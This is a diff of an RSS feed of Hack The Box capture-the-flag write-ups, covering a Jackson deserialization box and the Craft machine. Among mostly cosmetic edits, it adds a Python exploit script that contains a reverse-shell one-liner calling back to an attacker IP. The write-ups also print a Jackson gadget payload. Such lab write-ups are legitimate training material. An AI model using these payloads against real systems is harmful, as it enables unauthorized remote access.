@@ -25,39 +25,38 @@ Enumeration Running nmap reveals 2 services:</description>
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Online JSON parser
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we check the web server, we see that we can beutify/validate JSON. Also, the validate functionality is in Beta. So let&amp;rsquo;s check that first.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we check the web server, we see that we can beautify/validate JSON. Also, the validate functionality is in Beta. So let&amp;rsquo;s check that first.
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;Upon submitting &lt;code&gt;{&amp;quot;test&amp;quot;}&lt;/code&gt; we see the following error:
 &lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;So it&amp;rsquo;s expecting an array: &lt;code&gt;[&amp;quot;test&amp;quot;]&lt;/code&gt;.
 But that also throws an error:
 &lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id &#39;test&#39; as a subtype of [simple type, class java.lang.Object]: no such class found&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Now, in both of our errors we see that they&amp;rsquo;re thrown by a library called &lt;em&gt;jackson&lt;/em&gt;, which is used to
+&lt;p&gt;Now, in both of our errors we see that they&amp;rsquo;re thrown by a library called &lt;a href=&#34;https://github.com/FasterXML/jackson&#34;&gt;jackson&lt;/a&gt;, which is used to
 serialize or map POJO &lt;em&gt;(Plain Old Java Objects)&lt;/em&gt; to JSON and deserialize JSON to POJO. With some more searching we find a &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;CVE&lt;/a&gt; which addresses a deserialization vulnerability where an attacker could control the class to be deserialized.&lt;/p&gt;
 &lt;h2 id=&#34;understanding-the-cve&#34;&gt;Understanding the CVE&lt;/h2&gt;
 &lt;!-- raw HTML omitted --&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;What is serialization/deserialization&lt;/strong&gt;&lt;/em&gt;
-In order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization &amp;amp; deserialization is. Swapneil Kumar Dash wrote a beautiful &lt;a href=&#34;https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d&#34;&gt;article&lt;/a&gt; about this, however I will provide a short overview in this post as well.&lt;/p&gt;
+&lt;h3 id=&#34;what-is-serializationdeserialization&#34;&gt;What is serialization/deserialization?&lt;/h3&gt;
+&lt;p&gt;In order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization &amp;amp; deserialization is. Swapneil Kumar Dash wrote a beautiful &lt;a href=&#34;https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d&#34;&gt;article&lt;/a&gt; about this, however I will provide a short overview in this post as well.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;In computing, serialization  is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. Deserialization is the opposite.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;In our case, we translate java objects into JSON and vice-versa.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;* What could go wrong ?
-&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;what-could-go-wrong&#34;&gt;What could go wrong?&lt;/h3&gt;
 &lt;p&gt;Usually, in java we can use something like this to deserialize data:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FileInputStream fin  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileInputStream&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;your/file/path&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectInputStream in &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;fin&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;customClassInstance  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CustomClass&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; in&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main problem lies within the way readObject deserializes data which executes the class while also
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main problem lies within the way &lt;code&gt;readObject()&lt;/code&gt; deserializes data which executes the class while also
 throwing an error if we give it a serialized input of a different class.&lt;/p&gt;
 &lt;p&gt;I won&amp;rsquo;t go into much detail here on this topic, since it&amp;rsquo;s a broad one. However, if you&amp;rsquo;re interested in
 learning more about it you should check the resources and &lt;a href=&#34;https://www.youtube.com/watch?v=t-zVC-CxYjw&#34;&gt;this talk&lt;/a&gt; by &lt;strong&gt;Alexei Kojenov&lt;/strong&gt; which also made some great &lt;a href=&#34;https://github.com/kojenov/serial&#34;&gt;examples&lt;/a&gt; you can play
 around with.
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;How java gadgets work&lt;/strong&gt;&lt;/em&gt;
-Gadgets are just a class or funcion that&amp;rsquo;s available within the executing scope of an application. For example the following code is a simple implementation in Java:&lt;/p&gt;
+&lt;h3 id=&#34;how-java-gadgets-work&#34;&gt;How java gadgets work?&lt;/h3&gt;
+&lt;p&gt;Gadgets are just a class or funcion that&amp;rsquo;s available within the executing scope of an application. For example the following code is a simple implementation in Java:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* CacheManager.java */&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CacheManager&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; Serializable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Runnable initHook&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
@@ -81,8 +80,8 @@ Gadgets are just a class or funcion that&amp;rsquo;s available within the execut
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here, an attacker can inject a serialized &lt;code&gt;CommandTask&lt;/code&gt; into an input stream that will be read by &lt;code&gt;CacheManager&lt;/code&gt;, which in return invokes run. Therefore, he gains arbitrary command execution.
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Jackson library deserialization vulnerability POC&lt;/strong&gt;&lt;/em&gt;
-The &lt;em&gt;CVE&lt;/em&gt; of interest is focusing mostly on the &lt;em&gt;Jackson&lt;/em&gt; library. They found that when &lt;em&gt;Jackson&lt;/em&gt; deserializes a specific class (&lt;code&gt;ch.qos.logback.core.db.DriverManagerConnectionSource&lt;/code&gt;), it can be abused to instantiate a Java Database Connectivity &lt;em&gt;(JDBC)&lt;/em&gt;, which is used to connect &amp;amp; interact with the dabase. To understand better let&amp;rsquo;s break down the payload used in the &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;&lt;strong&gt;POC&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;h3 id=&#34;jackson-library-deserialization-vulnerability-poc&#34;&gt;Jackson library deserialization vulnerability POC&lt;/h3&gt;
+&lt;p&gt;The &lt;em&gt;CVE&lt;/em&gt; of interest is focusing mostly on the &lt;em&gt;Jackson&lt;/em&gt; library. They found that when &lt;em&gt;Jackson&lt;/em&gt; deserializes a specific class (&lt;code&gt;ch.qos.logback.core.db.DriverManagerConnectionSource&lt;/code&gt;), it can be abused to instantiate a Java Database Connectivity &lt;em&gt;(JDBC)&lt;/em&gt;, which is used to connect &amp;amp; interact with the dabase. To understand better let&amp;rsquo;s break down the payload used in the &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;&lt;strong&gt;POC&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;$ &amp;quot;[\&amp;quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&amp;quot;, {\&amp;quot;url\&amp;quot;:\&amp;quot;jdbc:h2:mem:\&amp;quot;}]&amp;quot;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;As said previously we use the &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; class to pass an url, which will trigger &lt;a href=&#34;https://www.javadoc.io/doc/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#setUrl(java.lang.String)&#34;&gt;&lt;code&gt;setUrl&lt;/code&gt;&lt;/a&gt;. Afterwards, the object is serialized into a JSON object again. Consequently, the &lt;code&gt;getConnection()&lt;/code&gt; &lt;a href=&#34;https://www.javadoc.io/static/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#getConnection()&#34;&gt;method&lt;/a&gt; is called which creates an in-memory database. This is further used to create a remote connection.
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -179,7 +178,19 @@ So we need to find the SuperSecureServer.py file in order to get the backend cod
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vhBYHsX.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;So we can execute code if we format correctly the &lt;code&gt;path&lt;/code&gt; variable. Therefore, I came up with this little python script:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mxg9BRw.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;When the server processes this, the &lt;code&gt;info&lt;/code&gt; variable will look like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;proxies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://127.0.0.1:8080&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;httpss&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://127.0.0.1:8080&amp;#39;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shell   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.161&amp;#34;,9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ape=&amp;#39;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;headers)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When the server processes this, the &lt;code&gt;info&lt;/code&gt; variable will look like this:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;output = &amp;lsquo;Document&amp;rsquo;
 &amp;lt;reverse_shell&amp;gt;
@@ -232,12 +243,12 @@ ape=&#39;&#39;&lt;/p&gt;
       
       <guid>https://vlagh3.github.io/writeups/htb/craft/</guid>
       <description>Changing hosts file By looking at the source code we can see gogs and api subdomains
-So I just modified the /etc/hosts to the following in order to access them.
+So I just modified the /etc/hosts to the following in order to access them:
 10.10.10.110 craft.htb gogs.craft.htb api.craft.htb Gogs page By a simple Google search we find out that Gogs is a somewhat widely used git service.
 Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented: By simply looking at the code we can easily identify where the vulnerability is.</description>
       <content>&lt;h2 id=&#34;changing-hosts-file&#34;&gt;Changing hosts file&lt;/h2&gt;
 &lt;p&gt;By looking at the source code we can see gogs and api subdomains&lt;/p&gt;
-&lt;p&gt;So I just modified the  /etc/hosts to the following in order to access them.&lt;/p&gt;
+&lt;p&gt;So I just modified the &lt;code&gt;/etc/hosts&lt;/code&gt; to the following in order to access them:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;gogs-page&#34;&gt;Gogs page&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wDN37yi.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -346,8 +357,8 @@ Now what?&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Note: Don&amp;rsquo;t overcomplicate things, work with what you have and exhaust every possibility before moving on&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;I&amp;rsquo;ve instantly looked at the &lt;code&gt;.ssh&lt;/code&gt; folder and found the private key and therefore got user.&lt;/p&gt;
 &lt;h1 id=&#34;getting-root&#34;&gt;Getting root&lt;/h1&gt;
-&lt;p&gt;Once I&amp;rsquo;ve got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.&lt;/p&gt;
-&lt;p&gt;After looking through almost everything, the &lt;code&gt;vault/secrets.sh&lt;/code&gt; popped as the most interesting to have a look at:&lt;/p&gt;
+&lt;p&gt;Once I&amp;rsquo;ve got user I immediately went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.&lt;/p&gt;
+&lt;p&gt;After looking through almost everything, the &lt;code&gt;vault/secrets.sh&lt;/code&gt; popped as the most interesting to peek at:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set up vault secrets backend&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault secrets enable ssh
